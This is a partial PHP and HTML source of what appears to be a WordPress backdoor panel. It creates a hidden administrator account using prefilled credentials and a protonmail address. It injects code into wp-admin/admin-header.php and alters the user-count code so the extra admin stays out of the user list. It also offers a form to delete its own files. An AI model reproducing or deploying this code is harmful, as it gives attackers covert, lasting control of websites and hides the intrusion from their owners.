...
if($user_name != '' && $pwd != '' && $email != ''){    
    ...
    if(mysqli_num_rows($check) > 0){
         $notice = 'This username or email address has already been used.';
        ...
        $path = ABSPATH.'wp-admin/admin-header.php';
         if(file_exists($path)){
            $temp = file_get_contents($path);
             if(strstr($temp, $code)){
                $notice .= 'Code has been added';
            }else{
                if(strstr($temp, '<div id="wpbody')){
                    $fp = fopen($path, "wb");
                    fwrite($fp, str_replace('<div id="wpbody', $code.'<div id="wpbody', $temp)); 
                   fclose($fp);
                    $notice .= 'Code added successfully.';
                }else{
                    $notice .= 'Code addition failed.';
                }
            }
        }else{
            $notice .= ' File lookup failed.';
        }
         ...
         if(file_exists($path)){
            ...
            if(strstr($temp, 'number_format_i18n( $total_users-1') && (strstr($temp, 'number_format_i18n( $avail_roles[ $this_role ]-1') || strstr($temp, 'number_format_i18n( $avail_roles[$this_role]-1')) ){
                $notice .= ' A hidden number code has been added';
            }else{
               ...
               fwrite($fp, $temp);
               fclose($fp);
                 $notice .= ' Hidden number code added successfully.';                
             }
         }else{
             $notice .= ' Hidden Numbers File lookup failed.';
        }
   }
...
<table class="table">
  ...
  <tr>
    <td colspan="5" align="left">【 add new admin 】</td>
  </tr>
  <tr>
    <td colspan="5" align="left"><form action="" method="post" name="form">username：<input type="text" value="eaglecyber" name="user_name"> password：<input type="text" value="TX0jO7wDcnBC" name="pwd"> Mail：<input type="text" value="ecc@protonmail.com" name="email"> <input type="submit"></form></td>
  </tr>
  <tr>
    <td colspan="5" align="left"><form action="" method="post" name="form"><input type='hidden' name="action" value='del'><input type="submit" value="Delete Files"></form></td>
  </tr>
  <tr>
    <td colspan="5" align="left">【 user list：<?php echo $total;?>bit 】</td>
  </tr>
  <?php if($total > 0){?>
  <tr>
    <td>ID</td>
